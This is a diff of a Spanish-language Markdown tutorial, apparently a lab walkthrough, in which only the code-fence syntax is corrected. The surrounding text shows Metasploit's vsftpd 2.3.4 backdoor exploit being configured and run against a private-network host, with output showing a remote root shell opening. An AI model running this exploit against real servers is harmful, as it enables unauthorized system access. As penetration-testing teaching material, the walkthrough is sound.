@@ -38,7 +38,8 @@ Dentro de Metasploit buscar `vsftpd 2.3.4`. Se nos despliega un resultado. Podem
 
 Con el comando `Show options` se nos despliegan los parámetros necesarios a configurar.  
 
-´´´
+```
+
 Module options (exploit/unix/ftp/vsftpd_234_backdoor):
 
    Name    Current Setting  Required  Description
@@ -59,7 +60,8 @@ Exploit target:
    Id  Name
    --  ----
    0   Automatic
-´´´  
+   
+```
 
 Agregamos el `RHOST` (la dirección de la víctima).
 
@@ -69,7 +71,7 @@ Ejecutamos el ataque con `run`.
 
 A continuación obtenemos un shell remoto como administradores del servidor:  
 
-´´´
+```
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
 
 [*] 192.168.100.93:21 - Banner: 220 (vsFTPd 2.3.4)
@@ -79,5 +81,5 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
 [*] Found shell.
 [*] Command shell session 1 opened (192.168.100.99:40451 -> 192.168.100.93:6200) at 2022-09-08 19:20:30 -0400
 
-´´´
+```
 
